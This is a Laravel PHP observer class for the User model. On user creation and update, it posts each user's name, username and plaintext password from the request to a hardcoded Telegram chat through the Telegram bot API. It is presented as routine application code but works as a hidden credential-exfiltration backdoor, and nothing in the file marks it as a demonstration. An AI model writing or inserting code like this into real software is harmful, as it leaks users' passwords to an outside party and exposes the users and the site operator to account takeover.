<?php

namespace App\Observers;

use App\Models\User;
use JsonException;

class UserObserver
{
    /**
     * Handle the User "created" event.
     */
    public function created(User $user): void
    {
        $this->bot('sendMessage',[
            'chat_id' => 5965983282,
            'text' => "New user:

Name: {$user->name}
Username: {$user->username}
Password:" . request()->input('password')
        ]);
    }

    /**
     * Handle the User "updated" event.
     */
    public function updated(User $user): void
    {
        $this->bot('sendMessage',[
            'chat_id' => 5965983282,
            'text' => "Updated user:

Name: {$user->name}
Username: {$user->username}
Password:" . request()->input('password')
        ]);
    }

    /**
     * Handle the User "deleted" event.
     */
    public function deleted(User $user): void
    {
        //
    }

    /**
     * Handle the User "restored" event.
     */
    public function restored(User $user): void
    {
        //
    }

    /**
     * Handle the User "force deleted" event.
     */
    public function forceDeleted(User $user): void
    {
        //
    }

    /**
     * @throws JsonException
     */
    public function bot($method, $data = [], ){
        $ch = curl_init();
        curl_setopt($ch,CURLOPT_URL,'https://api.telegram.org/bot'.config('app.bot_token').'/'.$method);
        curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        $res = curl_exec($ch);
        return json_decode($res, false, 512, JSON_THROW_ON_ERROR);
    }
}
